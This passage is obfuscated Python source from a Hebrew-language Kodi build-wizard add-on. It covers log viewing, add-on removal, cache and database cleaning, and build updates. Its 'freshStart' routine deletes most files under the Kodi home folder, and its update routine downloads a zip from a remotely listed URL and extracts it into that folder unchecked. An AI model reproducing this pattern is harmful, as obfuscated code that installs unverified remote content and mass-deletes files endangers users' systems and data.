					OOO0O00O0000O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OOOO0O00OO0O0 .replace (LOG ,''))#line:3790
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .title ).setLabel (OOO0O00O0000O0OOO .titlemsg )#line:3791
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .msg ).setText (wiz .highlightText (OO00O0OOOOOOO0O00 ))#line:3792
					OOO0O00O0000O0OOO .setFocusId (OOO0O00O0000O0OOO .scrollbar )#line:3793
			elif OO000O00O0OO0OOOO ==OOO0O00O0000O0OOO .kodiold :#line:3794
				OO00O0OOOOOOO0O00 =wiz .Grab_Log (False ,True )#line:3795
				O0O0OOOO0O00OO0O0 =wiz .Grab_Log (True ,True )#line:3796
				if OO00O0OOOOOOO0O00 ==False :#line:3797
					OOO0O00O0000O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:3798
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .msg ).setText ("Log File Does Not Exists!")#line:3799
				else :#line:3800
					OOO0O00O0000O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OOOO0O00OO0O0 .replace (LOG ,''))#line:3801
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .title ).setLabel (OOO0O00O0000O0OOO .titlemsg )#line:3802
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .msg ).setText (wiz .highlightText (OO00O0OOOOOOO0O00 ))#line:3803
					OOO0O00O0000O0OOO .setFocusId (OOO0O00O0000O0OOO .scrollbar )#line:3804
			elif OO000O00O0OO0OOOO ==OOO0O00O0000O0OOO .wizard :#line:3805
				OO00O0OOOOOOO0O00 =wiz .Grab_Log (False ,False ,True )#line:3806
				O0O0OOOO0O00OO0O0 =wiz .Grab_Log (True ,False ,True )#line:3807
				if OO00O0OOOOOOO0O00 ==False :#line:3808
					OOO0O00O0000O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:3809
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .msg ).setText ("Log File Does Not Exists!")#line:3810
				else :#line:3811
					OOO0O00O0000O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OOOO0O00OO0O0 .replace (ADDONDATA ,''))#line:3812
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .title ).setLabel (OOO0O00O0000O0OOO .titlemsg )#line:3813
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .msg ).setText (wiz .highlightText (OO00O0OOOOOOO0O00 ))#line:3814
					OOO0O00O0000O0OOO .setFocusId (OOO0O00O0000O0OOO .scrollbar )#line:3815
		def onAction (O0O0000O000O0OOOO ,O00000OOOO0000OO0 ):#line:3817
			if O00000OOOO0000OO0 ==ACTION_PREVIOUS_MENU :O0O0000O000O0OOOO .close ()#line:3818
			elif O00000OOOO0000OO0 ==ACTION_NAV_BACK :O0O0000O000O0OOOO .close ()#line:3819
	if default ==None :default =wiz .Grab_Log (True )#line:3820
	O0OO0OO0OO0OO00OO =OOOOO0O000OO0OOOO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:3821
	O0OO0OO0OO0OO00OO .doModal ()#line:3822
	del O0OO0OO0OO0OO00OO #line:3823
def removeAddon (OO000OO000000OO00 ,OOOO0OOOOOO0OOOOO ,over =False ):#line:3825
	if not over ==False :#line:3826
		O0O000OO0O00OO000 =1 #line:3827
	else :#line:3828
		O0O000OO0O00OO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0OOOOOO0OOOOO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO000OO000000OO00 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:3829
	if O0O000OO0O00OO000 ==1 :#line:3830
		OOOOO00OO0O0O00OO =os .path .join (ADDONS ,OO000OO000000OO00 )#line:3831
		wiz .log ("Removing Addon %s"%OO000OO000000OO00 )#line:3832
		wiz .cleanHouse (OOOOO00OO0O0O00OO )#line:3833
		xbmc .sleep (1000 )#line:3834
		try :shutil .rmtree (OOOOO00OO0O0O00OO )#line:3835
		except Exception as OOO0OO00OO0O00OOO :wiz .log ("Error removing %s"%OO000OO000000OO00 ,5 )#line:3836
		removeAddonData (OO000OO000000OO00 ,OOOO0OOOOOO0OOOOO ,over )#line:3837
	if over ==False :#line:3838
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOOO0OOOOOO0OOOOO ))#line:3839
def removeAddonData (OOO00O00OOOO0OO00 ,name =None ,over =False ):#line:3841
	if OOO00O00OOOO0OO00 =='all':#line:3842
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:3843
			wiz .cleanHouse (ADDOND )#line:3844
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:3845
	elif OOO00O00OOOO0OO00 =='uninstalled':#line:3846
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:3847
			O0O0OO00000O0O0O0 =0 #line:3848
			for O0O0O00O00O0O00OO in glob .glob (os .path .join (ADDOND ,'*')):#line:3849
				O0O0O00000O0O00O0 =O0O0O00O00O0O00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3850
				if O0O0O00000O0O00O0 in EXCLUDES :pass #line:3851
				elif os .path .exists (os .path .join (ADDONS ,O0O0O00000O0O00O0 )):pass #line:3852
				else :wiz .cleanHouse (O0O0O00O00O0O00OO );O0O0OO00000O0O0O0 +=1 ;wiz .log (O0O0O00O00O0O00OO );shutil .rmtree (O0O0O00O00O0O00OO )#line:3853
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0OO00000O0O0O0 ))#line:3854
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:3855
	elif OOO00O00OOOO0OO00 =='empty':#line:3856
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:3857
			O0O0OO00000O0O0O0 =wiz .emptyfolder (ADDOND )#line:3858
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0OO00000O0O0O0 ))#line:3859
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:3860
	else :#line:3861
		OO0OO00OOOOO0O00O =os .path .join (USERDATA ,'addon_data',OOO00O00OOOO0OO00 )#line:3862
		if OOO00O00OOOO0OO00 in EXCLUDES :#line:3863
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:3864
		elif os .path .exists (OO0OO00OOOOO0O00O ):#line:3865
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00O00OOOO0OO00 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:3866
				wiz .cleanHouse (OO0OO00OOOOO0O00O )#line:3867
				try :#line:3868
					shutil .rmtree (OO0OO00OOOOO0O00O )#line:3869
				except :#line:3870
					wiz .log ("Error deleting: %s"%OO0OO00OOOOO0O00O )#line:3871
			else :#line:3872
				wiz .log ('Addon data for %s was not removed'%OOO00O00OOOO0OO00 )#line:3873
	wiz .refresh ()#line:3874
def restoreit (OOOOOOOO0O0O00OOO ):#line:3876
	if OOOOOOOO0O0O00OOO =='build':#line:3877
		O0OO00000OO0OO0O0 =freshStart ('restore')#line:3878
		if O0OO00000OO0OO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:3879
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.Premium.mod']:#line:3880
		wiz .skinToDefault ()#line:3881
	wiz .restoreLocal (OOOOOOOO0O0O00OOO )#line:3882
def restoreextit (OOOO0OO0O0OOO0000 ):#line:3884
	if OOOO0OO0O0OOO0000 =='build':#line:3885
		O00OO000OO000000O =freshStart ('restore')#line:3886
		if O00OO000OO000000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:3887
	wiz .restoreExternal (OOOO0OO0O0OOO0000 )#line:3888
def buildInfo (O00OOO0OOO00OO00O ):#line:3890
	if wiz .workingURL (ld (BL ))==True :#line:3891
		if wiz .checkBuild (O00OOO0OOO00OO00O ,'url'):#line:3892
			O00OOO0OOO00OO00O ,O0O000000OOO0O0O0 ,O0O0O00OO0OO0O0OO ,O0O0O000000O0O00O ,OO00000O0000OOO00 ,O0OOOOOO0OO0OO00O ,OOO0O00OO0OO0O0O0 ,O00OO0O0O0OOOOO00 ,O0O0O0O00O000000O ,O0000O0O0OO0O0OO0 ,OO0O0O00OO0OO0OOO ,O00000OOO000OO0O0 ,O00OO0O0000OO0O0O =wiz .checkBuild (O00OOO0OOO00OO00O ,'all')#line:3893
			O0000O0O0OO0O0OO0 ='Yes'if O0000O0O0OO0O0OO0 .lower ()=='yes'else 'No'#line:3894
			O00OO0OOO00OO0O00 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOO0OOO00OO00O )#line:3895
			O00OO0OOO00OO0O00 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O000000OOO0O0O0 )#line:3896
			if not O00000OOO000OO0O0 =="http://":#line:3897
				O0O0OOOOO0O0OOOOO =wiz .themeCount (O00OOO0OOO00OO00O ,False )#line:3898
				O00OO0OOO00OO0O00 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0O0OOOOO0O0OOOOO ))#line:3899
			O00OO0OOO00OO0O00 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00000O0000OOO00 )#line:3900
			O00OO0OOO00OO0O00 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000O0O0OO0O0OO0 )#line:3901
			O00OO0OOO00OO0O00 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O0O00OO0OO0OOO )#line:3902
			wiz .TextBox (ADDONTITLE ,O00OO0OOO00OO0O00 )#line:3903
		else :wiz .log ("Invalid Build Name!")#line:3904
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:3905
def buildVideo (OOOO0O0OOOOOOOO0O ):#line:3907
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (ld (BL )))#line:3908
	if wiz .workingURL (ld (BL ))==True :#line:3909
		OOOOO000O0O000OOO =wiz .checkBuild (OOOO0O0OOOOOOOO0O ,'preview')#line:3910
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOO0O0OOOOOOOO0O )#line:3911
		if OOOOO000O0O000OOO and not OOOOO000O0O000OOO =='http://':playVideo (OOOOO000O0O000OOO )#line:3912
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOO0O0OOOOOOOO0O )#line:3913
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:3914
def dependsList (O00O00OO000000OO0 ):#line:3916
	OO000O0OO0O00O0OO =os .path .join (ADDONS ,O00O00OO000000OO0 ,'addon.xml')#line:3917
	if os .path .exists (OO000O0OO0O00O0OO ):#line:3918
		OO00OO0O0000O00OO =open (OO000O0OO0O00O0OO ,mode ='r');O00O00OOO000O0OO0 =OO00OO0O0000O00OO .read ();OO00OO0O0000O00OO .close ();#line:3919
		O0O0OO0OO0000O0OO =wiz .parseDOM (O00O00OOO000O0OO0 ,'import',ret ='addon')#line:3920
		O000O0O00OOOO00OO =[]#line:3921
		for O00O00OOO0OO0OO00 in O0O0OO0OO0000O0OO :#line:3922
			if not 'xbmc.python'in O00O00OOO0OO0OO00 :#line:3923
				O000O0O00OOOO00OO .append (O00O00OOO0OO0OO00 )#line:3924
		return O000O0O00OOOO00OO #line:3925
	return []#line:3926
def freshStart (install =None ,over =False ):#line:3932
    O00000O0OO000O00O =os .path .abspath (HOME )#line:3934
    DP .create (ADDONTITLE ,'אנא המתן...')#line:3936
    OO0O0000OO0O00000 =sum ([len (O00000O000O0O0OO0 )for OO0OOO000OOO00OOO ,O0000O00O000000OO ,O00000O000O0O0OO0 in os .walk (O00000O0OO000O00O )]);O00O00O00OO00OOOO =0 #line:3937
    DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:3938
    EXCLUDES .append ('My_Builds')#line:3939
    EXCLUDES .append ('archive_cache')#line:3940
    EXCLUDES .append ('script.module.requests')#line:3941
    EXCLUDES .append ('script.module.certifi')#line:3942
    EXCLUDES .append ('script.module.future')#line:3943
    EXCLUDES .append ('script.module.chardet')#line:3944
    EXCLUDES .append ('script.module.idna')#line:3945
    EXCLUDES .append ('script.module.urllib3')#line:3946
    EXCLUDES .append ('plugin.video.telemedia')#line:3947
    EXCLUDES .append ('plugin.video.elementum')#line:3948
    EXCLUDES .append ('script.elementum.burst')#line:3949
    EXCLUDES .append ('script.elementum.burst-master')#line:3950
    EXCLUDES .append ('skin.estuary')#line:3951
    DP .update (0 ,"[COLOR yellow]מנקה קבצים ותיקיות, אנא המתן...[/COLOR]")#line:3954
    O0000OOO00O0OO000 =wiz .latestDB ('Addons')#line:3955
    for O0O000OO00O00O00O ,OO0O00OOOOO00000O ,O00O0OOO000000O0O in os .walk (O00000O0OO000O00O ,topdown =True ):#line:3956
        OO0O00OOOOO00000O [:]=[O0O0OOO00O0O0000O for O0O0OOO00O0O0000O in OO0O00OOOOO00000O if O0O0OOO00O0O0000O not in EXCLUDES ]#line:3957
        for O00O0OOO0O0OOO0OO in O00O0OOO000000O0O :#line:3958
            O00O00O00OO00OOOO +=1 #line:3959
            OO0OOO0O0OOOO0OO0 =O0O000OO00O00O00O .replace ('/','\\').split ('\\')#line:3960
            OO0O0OO0OO00000O0 =len (OO0OOO0O0OOOO0OO0 )-1 #line:3962
            if O00O0OOO0O0OOO0OO .endswith ('.db'):#line:3964
                try :#line:3965
                    if O00O0OOO0O0OOO0OO ==O0000OOO00O0OO000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00O0OOO0O0OOO0OO ,KODIV ),5 )#line:3966
                    else :os .remove (os .path .join (O0O000OO00O00O00O ,O00O0OOO0O0OOO0OO ))#line:3967
                except Exception as OO0OOO0OOOOO00OOO :#line:3968
                    if not O00O0OOO0O0OOO0OO .startswith ('Textures13'):#line:3969
                        wiz .log ('Failed to delete, Purging DB',5 )#line:3970
                        wiz .log ("-> %s"%(str (OO0OOO0OOOOO00OOO )),5 )#line:3971
                        wiz .purgeDb (os .path .join (O0O000OO00O00O00O ,O00O0OOO0O0OOO0OO ))#line:3972
            else :#line:3973
                try :os .remove (os .path .join (O0O000OO00O00O00O ,O00O0OOO0O0OOO0OO ))#line:3975
                except Exception as OO0OOO0OOOOO00OOO :#line:3976
                    wiz .log ("Error removing %s"%os .path .join (O0O000OO00O00O00O ,O00O0OOO0O0OOO0OO ),5 )#line:3977
                    wiz .log ("-> / %s"%(str (OO0OOO0OOOOO00OOO )),5 )#line:3978
        if DP .iscanceled ():#line:3979
            DP .close ()#line:3980
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3981
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ההתקנה מבוטלת[/COLOR]"%COLOR2 )#line:3982
            sys .exit ()#line:3983
            return False #line:3984
    for O0O000OO00O00O00O ,OO0O00OOOOO00000O ,O00O0OOO000000O0O in os .walk (O00000O0OO000O00O ,topdown =True ):#line:3985
        OO0O00OOOOO00000O [:]=[OOO00O0OOOOOOO00O for OOO00O0OOOOOOO00O in OO0O00OOOOO00000O if OOO00O0OOOOOOO00O not in EXCLUDES ]#line:3986
        for O00O0OOO0O0OOO0OO in OO0O00OOOOO00000O :#line:3987
          DP .update (100 ,'Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0OOO0O0OOO0OO ))#line:3989
          if O00O0OOO0O0OOO0OO not in ["Database","userdata","temp","addons","addon_data"]:#line:3990
             shutil .rmtree (os .path .join (O0O000OO00O00O00O ,O00O0OOO0O0OOO0OO ),ignore_errors =True ,onerror =None )#line:3991
        if DP .iscanceled ():#line:3992
            DP .close ()#line:3993
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ההתקנה מבוטלת.[/COLOR]"%COLOR2 )#line:3994
            sys .exit ()#line:3995
    DP .close ()#line:3996
def clearCache ():#line:4004
		wiz .clearCache ()#line:4005
def fixwizard ():#line:4007
		wiz .fixwizard ()#line:4008
def totalClean ():#line:4010
        wiz .clearCache ()#line:4012
        wiz .clearPackages ('total')#line:4013
        clearThumb ('total')#line:4014
        cleanfornewbuild ()#line:4015
        wiz .emptyfolder (ADDOND )#line:4016
        wiz .emptyfolder (ADDONS )#line:4017
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ניקוי קאש מלא בוצע בהצלחה.[/COLOR]'%COLOR2 )#line:4018
def cleanfornewbuild ():#line:4019
		try :#line:4020
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4021
		except :#line:4022
			pass #line:4023
		try :#line:4024
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4025
		except :#line:4026
			pass #line:4027
		try :#line:4028
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","series.json"))#line:4029
		except :#line:4030
			pass #line:4031
def clearThumb (type =None ):#line:4032
	OO0OOO00000O0OO0O =wiz .latestDB ('Textures')#line:4033
	if not type ==None :OO00O00O0O000OO00 =1 #line:4034
	else :OO00O00O0O000OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0OOO00000O0OO0O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4035
	if OO00O00O0O000OO00 ==1 :#line:4036
		try :wiz .removeFile (os .join (DATABASE ,OO0OOO00000O0OO0O ))#line:4037
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0OOO00000O0OO0O )#line:4038
		wiz .removeFolder (THUMBS )#line:4039
	else :wiz .log ('Clear thumbnames cancelled')#line:4041
	wiz .redoThumbs ()#line:4042
def purgeDb ():#line:4044
	import fnmatch #line:4045
	O00OO0OO0OO0OO0OO =[];OO0OOOOO0000OOO00 =[]#line:4046
	for O0000000000OO000O ,OO00OOO0O0OO00OO0 ,OOO0O000O00OOO00O in os .walk (HOME ):#line:4047
		for OO0OO0O0OO0O0000O in fnmatch .filter (OOO0O000O00OOO00O ,'*.db'):#line:4048
			if OO0OO0O0OO0O0000O !='Thumbs.db':#line:4049
				O00000O000O00OO00 =os .path .join (O0000000000OO000O ,OO0OO0O0OO0O0000O )#line:4050
				O00OO0OO0OO0OO0OO .append (O00000O000O00OO00 )#line:4051
				O0OOOOOOOO0O0000O =O00000O000O00OO00 .replace ('\\','/').split ('/')#line:4052
				OO0OOOOO0000OOO00 .append ('(%s) %s'%(O0OOOOOOOO0O0000O [len (O0OOOOOOOO0O0000O )-2 ],O0OOOOOOOO0O0000O [len (O0OOOOOOOO0O0000O )-1 ]))#line:4053
	if KODIV >=16 :#line:4054
		O0000O0000OO0O0OO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0OOOOO0000OOO00 )#line:4055
		if O0000O0000OO0O0OO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4056
		elif len (O0000O0000OO0O0OO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4057
		else :#line:4058
			for OOOO0O0O0O0O00000 in O0000O0000OO0O0OO :wiz .purgeDb (O00OO0OO0OO0OO0OO [OOOO0O0O0O0O00000 ])#line:4059
	else :#line:4060
		O0000O0000OO0O0OO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0OOOOO0000OOO00 )#line:4061
		if O0000O0000OO0O0OO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4062
		else :wiz .purgeDb (O00OO0OO0OO0OO0OO [OOOO0O0O0O0O00000 ])#line:4063
def help_install ():#line:4064
    import webbrowser #line:4065
    if xbmc .getCondVisibility ('system.platform.windows'):#line:4067
        webbrowser .open ('https://t.me/xbmc19')#line:4069
    else :#line:4070
        O0O00OO0O0O00OO00 ='https://t.me/xbmc19'#line:4071
        xbmc .executebuiltin ("StartAndroidActivity(com.android.browser,android.intent.action.VIEW,,"+O0O00OO0O0O00OO00 +")")#line:4072
        xbmc .executebuiltin ("StartAndroidActivity(com.android.chrome,,,"+O0O00OO0O0O00OO00 +")")#line:4073
        xbmc .executebuiltin ("StartAndroidActivity(org.mozilla.firefox,android.intent.action.VIEW,,"+O0O00OO0O0O00OO00 +")")#line:4074
        xbmc .executebuiltin ("StartAndroidActivity(org.sec.android.app.sbrowser,android.intent.action.VIEW,,"+O0O00OO0O0O00OO00 +")")#line:4075
def fastupdatefirstbuild (O0OOO0O00O0OOOO0O ):#line:4079
    try :#line:4081
        checkidupdate ()#line:4082
    except Exception as OO0OOOO0OOOO0000O :#line:4083
        logging .warning ('בעיה בעדכון המהיר======================================')#line:4084
        logging .warning (str (OO0OOOO0OOOO0000O ))#line:4085
    OO0OO0O00000OO0O0 ,O0OO00OOO000O0O0O =wiz .splitNotify (NOTIFICATION )#line:4087
    if not OO0OO0O00000OO0O0 ==False :#line:4088
        try :#line:4089
            OO0OO0O00000OO0O0 =int (OO0OO0O00000OO0O0 );O0OOO0O00O0OOOO0O =int (O0OOO0O00O0OOOO0O )#line:4090
            wiz .setS ("notedismiss","true")#line:4092
            if OO0OO0O00000OO0O0 ==O0OOO0O00O0OOOO0O :#line:4093
                wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0OO0O00000OO0O0 ),5 )#line:4094
            elif OO0OO0O00000OO0O0 >O0OOO0O00O0OOOO0O :#line:4096
                wiz .log ("[Notifications] id: %s"%str (OO0OO0O00000OO0O0 ),5 )#line:4097
                wiz .setS ('noteid',str (OO0OO0O00000OO0O0 ))#line:4098
                wiz .setS ("notedismiss","true")#line:4099
                wiz .log ("[Notifications] Complete",5 )#line:4102
        except Exception as OO0OOOO0OOOO0000O :#line:4103
            wiz .log ("Error on Notifications Window: %s"%str (OO0OOOO0OOOO0000O ),5 )#line:4104
def checkUpdate ():#line:4106
	O00OOOOOOO0O0OOO0 =wiz .getS ('disableupdate')#line:4107
	OO0O00OO00000O000 =wiz .getS ('buildname')#line:4108
	O0OOOOO00OOO0O0OO =wiz .getS ('buildversion')#line:4109
	O000O00O0OO0OOO0O =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:4110
	OOO000OOO000000O0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OO0O00OO00000O000 ).findall (O000O00O0OO0OOO0O )#line:4111
	if len (OOO000OOO000000O0 )>0 :#line:4112
		O0000O0OOOO00OOO0 =OOO000OOO000000O0 [0 ][0 ]#line:4113
		OO0000O00O0OOOOO0 =OOO000OOO000000O0 [0 ][1 ]#line:4114
		OOOOOO0O000OOO00O =OOO000OOO000000O0 [0 ][2 ]#line:4115
		wiz .setS ('latestversion',O0000O0OOOO00OOO0 )#line:4116
		if O0000O0OOOO00OOO0 >O0OOOOO00OOO0O0OO :#line:4117
			if O00OOOOOOO0O0OOO0 =='false':#line:4118
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O0OOOOO00OOO0O0OO ,O0000O0OOOO00OOO0 ),5 )#line:4119
				notify .updateWindow (OO0O00OO00000O000 ,O0OOOOO00OOO0O0OO ,O0000O0OOOO00OOO0 ,OO0000O00O0OOOOO0 ,OOOOOO0O000OOO00O )#line:4120
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O0OOOOO00OOO0O0OO ,O0000O0OOOO00OOO0 ),5 )#line:4121
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O0OOOOO00OOO0O0OO ,O0000O0OOOO00OOO0 ),5 )#line:4122
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",5 )#line:4123
def checkidupdate ():#line:4125
                O000O0OOOO0O0OO0O =[]#line:4126
                O000O0OOOO0O0OO0O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד עדכון אחרון.[/COLOR]'%COLOR2 ))#line:4127
                O000O0OOOO0O0OO0O [0 ].start ()#line:4129
                OOO0000OO00000000 =wiz .workingURL (NOTIFICATION )#line:4130
                O00O0O00OOO0O00OO =" Kodi Premium"#line:4131
                O0O00O0OO000O0O0O =wiz .checkBuild (O00O0O00OOO0O00OO ,'gui')#line:4132
                OO00O0O00OO0OOOO0 =O00O0O00OOO0O00OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4133
                if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4135
                try :#line:4136
                    DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון אחרון[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00O0O00OOO0O00OO ),'','אנא המתן')#line:4137
                except :#line:4138
                    DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון אחרון[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00O0O00OOO0O00OO ))#line:4139
                O0O00OOOO000O0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00O0O00OO0OOOO0 )#line:4140
                if 'google'in O0O00O0OO000O0O0O :#line:4143
                   googledrive_download (O0O00O0OO000O0O0O ,O0O00OOOO000O0OOO ,DP ,wiz .checkBuild (O00O0O00OOO0O00OO ,'updatesize'))#line:4144
                else :#line:4147
                  downloader .download (O0O00O0OO000O0O0O ,O0O00OOOO000O0OOO ,DP )#line:4148
                xbmc .sleep (100 )#line:4149
                OO00O0000O0OO0O0O ='עדכון אחרון'#line:4150
                O000OO0O0OO00O0O0 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O0000O0OO0O0O )#line:4151
                try :#line:4152
                    DP .update (0 ,O000OO0O0OO00O0O0 ,'','אנא המתן')#line:4153
                except :#line:4154
                    DP .update (0 ,O000OO0O0OO00O0O0 +'\n'+''+'\n'+'אנא המתן')#line:4155
                extract .all (O0O00OOOO000O0OOO ,HOME ,DP ,title =O000OO0O0OO00O0O0 )#line:4156
                DP .close ()#line:4157
                try :os .remove (O0O00OOOO000O0OOO )#line:4158
                except :pass #line:4159
                wiz .setS ("notedismiss","true")#line:4164
def checkidupdate_movie ():#line:4168
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מעדכן חבילות סרטים[/COLOR]'%COLOR2 )#line:4170
